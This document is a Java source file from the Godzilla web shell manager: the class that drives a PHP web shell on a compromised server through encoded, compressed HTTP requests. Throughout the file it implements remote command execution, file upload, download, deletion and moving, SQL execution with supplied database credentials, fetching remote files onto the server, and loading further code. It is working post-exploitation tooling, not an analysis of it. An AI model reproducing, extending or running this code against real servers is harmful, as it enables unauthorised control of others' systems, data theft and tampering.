package net.BeichenDream.Godzilla.shells.payloads.php;

import net.BeichenDream.Godzilla.core.Encoding;
import net.BeichenDream.Godzilla.core.annotation.PayloadAnnotation;
import net.BeichenDream.Godzilla.core.imp.Payload;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import java.io.InputStream;
import java.util.Map;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.Http;
import net.BeichenDream.Godzilla.util.http.ReqParameter;

@PayloadAnnotation(Name = "PhpDynamicPayload")
public class PhpShell implements Payload {
    private static final String[] ALL_DATABASE_TYPE = {"mysql", "oracle", "sqlserver", "postgresql"};
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|canCallGzipDecode|canCallGzipEncode) : (.+)";
    private String basicsInfo;
    private String currentDir;
    private String currentUser;
    private Encoding encoding;
    private String fileRoot;
    private int gzipDecodeMagic = -1;
    private int gzipEncodeMagic = -1;
    private Http http;
    private String osInfo;
    private ShellEntity shell;

    @Override // core.imp.Payload
    public void init(ShellEntity shellContext) {
        this.shell = shellContext;
        this.http = this.shell.getHttp();
        this.encoding = Encoding.getEncoding(this.shell);
    }

    @Override // core.imp.Payload
    public String getFile(String filePath) {
        ReqParameter parameters = new ReqParameter();
        Encoding encoding2 = this.encoding;
        if (filePath.length() <= 0) {
            filePath = " ";
        }
        parameters.add("dirName", encoding2.Encoding(filePath));
        return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
    }

    @Override // core.imp.Payload
    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        return evalFunc(null, "readFileContent", parameter);
    }

    @Override // core.imp.Payload
    public String getBasicsInfo() {
        if (this.basicsInfo == null) {
            this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", new ReqParameter()));
        }
        Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, BASICINFO_REGEX);
        this.fileRoot = pxMap.get("FileRoot");
        this.currentDir = pxMap.get("CurrentDir");
        this.currentUser = pxMap.get("CurrentUser");
        this.osInfo = pxMap.get("OsInfo");
        this.gzipDecodeMagic = functions.stringToint(pxMap.get("canCallGzipDecode"));
        this.gzipEncodeMagic = functions.stringToint(pxMap.get("canCallGzipEncode"));
        return this.basicsInfo;
    }

    @Override // core.imp.Payload
    public boolean include(String codeName, byte[] binCode) {
        ReqParameter parameters = new ReqParameter();
        parameters.add("codeName", codeName);
        parameters.add("binCode", binCode);
        String resultString = new String(evalFunc(null, "includeCode", parameters)).trim();
        if (resultString.equals("ok")) {
            return true;
        }
        Log.error(resultString);
        return false;
    }

    @Override // core.imp.Payload
    public byte[] evalFunc(String className, String funcName, ReqParameter praameter) {
        if (className != null && className.trim().length() > 0) {
            praameter.add("codeName", className);
        }
        praameter.add("methodName", funcName);
        byte[] data = praameter.formatEx();
        if (this.gzipDecodeMagic == 1) {
            data = functions.gzipE(data);
        }
        byte[] result = this.http.sendHttpResponse(data).getResult();
        if ((this.gzipEncodeMagic == -1 || this.gzipEncodeMagic == 1) && functions.isGzipStream(result)) {
            return functions.gzipD(result);
        }
        return result;
    }

    @Override // core.imp.Payload
    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        String stateString = this.encoding.Decoding(evalFunc(null, "uploadFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        String stateString = this.encoding.Decoding(evalFunc(null, "copyFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        String stateString = this.encoding.Decoding(evalFunc(null, "deleteFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        String stateString = this.encoding.Decoding(evalFunc(null, "newFile", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        String stateString = this.encoding.Decoding(evalFunc(null, "newDir", parameter));
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override // core.imp.Payload
    public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, String execSql) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dbType", dbType);
        parameter.add("dbHost", dbHost);
        parameter.add("dbPort", Integer.toString(dbPort));
        parameter.add("dbUsername", dbUsername);
        parameter.add("dbPassword", dbPassword);
        parameter.add("execType", execType);
        parameter.add("execSql", this.encoding.Encoding(execSql));
        return this.encoding.Decoding(evalFunc(null, "execSql", parameter));
    }

    @Override // core.imp.Payload
    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        }
        getBasicsInfo();
        return functions.formatDir(this.currentDir);
    }

    @Override // core.imp.Payload
    public boolean test() {
        String codeString = new String(evalFunc(null, "test", new ReqParameter()));
        if (codeString.trim().equals("ok")) {
            return true;
        }
        Log.error(codeString);
        return false;
    }

    @Override // core.imp.Payload
    public String currentUserName() {
        if (this.currentUser != null) {
            return this.currentUser;
        }
        getBasicsInfo();
        return this.currentUser;
    }

    @Override // core.imp.Payload
    public String bigFileUpload(String fileName, int position, byte[] content) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileContents", content);
        reqParameter.add("fileName", fileName);
        reqParameter.add("position", String.valueOf(position));
        return this.encoding.Decoding(evalFunc(null, "bigFileUpload", reqParameter));
    }

    @Override // core.imp.Payload
    public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("position", String.valueOf(position));
        reqParameter.add("readByteNum", String.valueOf(readByteNum));
        reqParameter.add("fileName", fileName);
        reqParameter.add("mode", "read");
        return evalFunc(null, "bigFileDownload", reqParameter);
    }

    @Override // core.imp.Payload
    public int getFileSize(String fileName) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileName", fileName);
        reqParameter.add("mode", "fileSize");
        String ret = this.encoding.Decoding(evalFunc(null, "bigFileDownload", reqParameter));
        try {
            return Integer.parseInt(ret);
        } catch (Exception e) {
            Log.error(e);
            Log.error(ret);
            return -1;
        }
    }

    @Override // core.imp.Payload
    public String[] listFileRoot() {
        if (this.fileRoot != null) {
            return this.fileRoot.split(";");
        }
        getBasicsInfo();
        return this.fileRoot.split(";");
    }

    @Override // core.imp.Payload
    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        return this.encoding.Decoding(evalFunc(null, "execCommand", parameter));
    }

    @Override // core.imp.Payload
    public String getOsInfo() {
        if (this.osInfo != null) {
            return this.osInfo;
        }
        getBasicsInfo();
        return this.osInfo;
    }

    @Override // core.imp.Payload
    public String[] getAllDatabaseType() {
        return ALL_DATABASE_TYPE;
    }

    @Override // core.imp.Payload
    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        String stasteString = this.encoding.Decoding(evalFunc(null, "moveFile", parameter));
        if ("ok".equals(stasteString)) {
            return true;
        }
        Log.error(stasteString);
        return false;
    }

    @Override // core.imp.Payload
    public byte[] getPayload() {
        byte[] data = null;
        try {
            InputStream fileInputStream = PhpShell.class.getResourceAsStream("assets/payload.php");
            data = functions.readInputStream(fileInputStream);
            fileInputStream.close();
            return data;
        } catch (Exception e) {
            Log.error(e);
            return data;
        }
    }

    @Override // core.imp.Payload
    public boolean fileRemoteDown(String url, String saveFile) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("url", this.encoding.Encoding(url));
        reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
        String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }

    @Override // core.imp.Payload
    public boolean setFileAttr(String file, String type, String fileAttr) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("type", type);
        reqParameter.add("fileName", this.encoding.Encoding(file));
        reqParameter.add("attr", fileAttr);
        String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }

    @Override // core.imp.Payload
    public boolean close() {
        String result = this.encoding.Decoding(evalFunc(null, "close", new ReqParameter()));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }
}
